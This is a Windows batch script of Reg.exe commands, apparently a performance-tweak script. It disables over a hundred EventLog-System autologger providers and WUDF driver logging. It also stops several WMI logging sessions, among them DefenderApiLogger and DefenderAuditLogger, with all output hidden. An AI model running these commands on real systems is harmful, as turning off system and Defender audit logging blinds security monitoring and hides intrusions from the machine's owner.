Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4cb314df-c11f-47d7-9c04-65fb0051561b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4cec9c95-a65f-4591-b5c4-30100e51d870}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{4ee76bd8-3cf4-44a0-a0ac-3937643e37a3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{52fc89f8-995e-434c-a91e-199986449890}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{530fb9b9-c515-4472-9313-fb346f9255e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{538cbbad-4877-4eb2-b26e-7caee8f0f8cb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{54cb22ff-26b4-4393-a8c2-6b0715912c5f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{555908d1-a6d7-4695-8e1e-26931d2012f4}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{55ab77f6-fa04-43ef-af45-688fbf500482}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{595f7f52-c90a-4026-a125-8eb5e083f15e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5d674230-ca9f-11da-a94d-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5d896912-022d-40aa-a3a8-4fa5515c76d7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{5f92bc59-248f-4111-86a9-e393e12c6139}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{62de9e48-90c6-4755-8813-6a7d655b0802}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{632f767e-0ec3-47b9-ba1c-a0e62a74728a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{63d1e632-95cc-4443-9312-af927761d52a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{64ef2b1c-4ae1-4e64-8599-1636e441ec88}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{651df93b-5053-4d1e-94c5-f6e6d25908d0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{66a5c15c-4f8e-4044-bf6e-71d896038977}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{67fe2216-727a-40cb-94b2-c02211edb34a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6a1f2b00-6a90-4c38-95a5-5cab3b056778}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6b93bf66-a922-4c11-a617-cf60d95c133d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{6bba3851-2c7e-4dea-8f54-31e5afd029e3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7237fff9-a08a-4804-9c79-4a8704b70b87}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{72cd9ff7-4af8-4b89-aede-5f26fda13567}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{73a33ab2-1966-4999-8add-868c41415269}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{73e9c9de-a148-41f7-b1db-4da051fdc327}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{74c2135f-cc76-45c3-879a-ef3bb1eeaf86}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{75ebc33e-997f-49cf-b49f-ecc50184b75d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7725b5f9-1f2e-4e21-baeb-b2af4690bc87}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7b563579-53c8-44e7-8236-0f87b9fe6594}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7b6bc78c-898b-4170-bbf8-1a469ea43fc5}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7d5387b0-cbe0-11da-a94d-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{7da4fe0e-fd42-4708-9aa5-89b77a224885}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{85a62a0d-7e17-485f-9d4f-749a287193a6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89203471-d554-47d4-bde4-7552ec219999}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89592015-d996-4636-8f61-066b5d4dd739}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{89fe8f40-cdce-464e-8217-15ef97d4c7c3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{8c416c79-d49b-4f01-a467-e56d3aa8234c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{8e6a5303-a4ce-498f-afdb-e03a8a82b077}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{945a8954-c147-4acd-923f-40c45405a658}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{951b41ea-c830-44dc-a671-e2c9958809b8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{95353826-4fbe-41d4-9c42-f521c6e86360}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9580d7dd-0379-4658-9870-d5be7d52d6de}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{96f4a050-7e31-453c-88be-9634f4e02139}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9741fd4e-3757-479f-a3c6-fc49f6d5edd0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{988c59c5-0a1c-45b6-a555-0c62276e327d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{991f8fe6-249d-44d6-b93d-5a3060c1dedb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9988748e-c2e8-4054-85f6-0c3e1cad2470}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9c205a39-1250-487d-abd7-e831c6290539}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9f650c63-9409-453c-a652-83d7185a2e83}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{9f7b5df4-b902-48bc-bc94-95068c6c7d26}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a0e3d8ea-c34f-4419-a1db-90435b8b21d0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a4445c76-ed85-c8a3-02c1-532a38614a9e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a67075c2-3e39-4109-b6cd-6d750058a731}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a6ad76e3-867a-4635-91b3-4904ba6374d7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a7f2235f-be51-51ed-decf-f4498812a9a2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{a8a1f2f6-a13a-45e9-b1fe-3419569e5ef2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aa3aa23b-bb6d-425a-b58c-1d7e37f5d02a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{abf1f586-2e50-4ba8-928d-49044e6f0db7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ac43300d-5fcc-4800-8e99-1bd3f85f0320}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ac52ad17-cc01-4f85-8df5-4dce4333c99b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ad5162d8-daf0-4a25-88a7-01cbeb33902e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ae4bd3be-f36f-45b6-8d21-bdd6fb832853}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aea1b4fa-97d1-45f2-a64c-4d69fffd92c9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{aec5c129-7c10-407d-be97-91a042c61aaa}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b0aa8734-56f7-41cc-b2f4-de228e98b946}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b2fcd41f-9a40-4150-8c92-b224b7d8c8aa}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b675ec37-bdb6-4648-bc92-f3fdc74d3ca2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b977cf02-76f6-df84-cc1a-6a4b232322b6}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{b99317e5-89b7-4c0d-abd1-6e705f7912dc}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ba093605-3909-4345-990b-26b746adee0a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ba2ffb5c-e20a-4fb9-91b4-45f61b4b66a0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{babda89a-4d5e-48eb-af3d-e0e8410207c0}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{bc0669e1-a10d-4a78-834e-1ca3c806c93b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c02afc2b-e24e-4449-ad76-bcc2c2575ead}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c03715ce-ea6f-5b67-4449-da1d1e1afeb8}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c18672d1-dc18-4dfd-91e4-170cf37160cf}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c26c4f3c-3f66-4e99-8f8a-39405cfed220}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c4636a1e-7986-4646-bf10-7bc3b4a76e8e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c76baa63-ae81-421c-b425-340b4b24157f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{c914f0df-835a-4a22-8c70-732c9a80c634}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cb017cd2-1f37-4e65-82bc-3e91f6a37559}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cbda4dbf-8d5d-4f69-9578-be14aa540d22}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cd9c6198-bf73-4106-803b-c17d26559018}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cdc05e28-c449-49c6-b9d2-88cf761644df}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cdead503-17f5-4a3e-b7ae-df8cc2902eb9}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ce8dee0b-d539-4000-b0f8-77bed049c590}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{cfc18ec0-96b1-4eba-961b-622caee05b0a}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d0e22efc-ac66-4b25-a72d-382736b5e940}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d1bc9aff-2abf-4d71-9146-ecb2a986eb85}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d48ce617-33a2-4bc3-a5c7-11aa4f29619e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d5c25f9a-4d47-493e-9184-40dd397a004d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{d6f68875-cdf5-43a5-a3e3-53ffd683311c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dbe9b383-7cf3-4331-91cc-a3cb16a3b538}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dd70bc80-ef44-421b-8ac3-cd31da613a4e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{de29cf61-5ee6-43ff-9aac-959c4e13cc6c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{de7b24ea-73c8-4a09-985d-5bdadcfa9017}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{dea07764-0790-44de-b9c4-49677b17174f}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e104fb41-6b04-4f3a-b47d-f0df2f02b954}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e2816346-87f4-4f85-95c3-0c79409aa89d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e3bac9f8-27be-4823-8d7f-1cc320c05fa7}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e4480490-85b6-11dd-ad8b-0800200c9a66}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e4f68870-5ae8-4e5b-9ce7-ca9ed75b0245}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e595f735-b42a-494b-afcd-b68666945cd3}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e5ba83f6-07d0-46b1-8bc7-7e669a1d31dc}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e670a5a2-ce74-4ab4-9347-61b815319f4c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{e8f9af91-afbe-5a03-dfec-5d591686326c}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ea216962-877b-5b73-f7c5-8aef5375959e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{eee173ef-7ed2-45de-9877-01c70a852fbd}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{ef1cc15b-46c1-414e-bb95-e76b077bd51e}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f029ac39-38f0-4a40-b7de-404d244004cb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f2e2ce31-0e8a-4e46-a03b-2e0fe97e93c2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f3c5e28e-63f6-49c7-a204-e48a1bc4b09d}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f5d05b38-80a6-4653-825d-c414e4ab3c68}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f708c483-4880-11e6-9121-5cf37068b67b}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f717d024-f5b4-4f03-9ab9-331b2dc38ffb}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{f9fe3908-44b8-48d9-9a32-5a763ff5ed79}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fae10392-f0af-4ac0-b8ff-9f4d920c3cdf}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fc4e8f51-7a04-4bab-8b91-6321416f72ab}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{fcbb06bb-6a2a-46e3-abaa-246cb4e508b2}" /v "Enabled" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppModel" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Cellcore" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\CloudExperienceHostOobe" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DataMarket" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\HolographicDevice" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsClient" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\iclsProxy" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\LwtNetLog" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Mellanox-Kernel" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-AssignedAccess-Trace" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Setup" /v "Start" /t REG_DWORD /d "0" /f > nul 2>&1
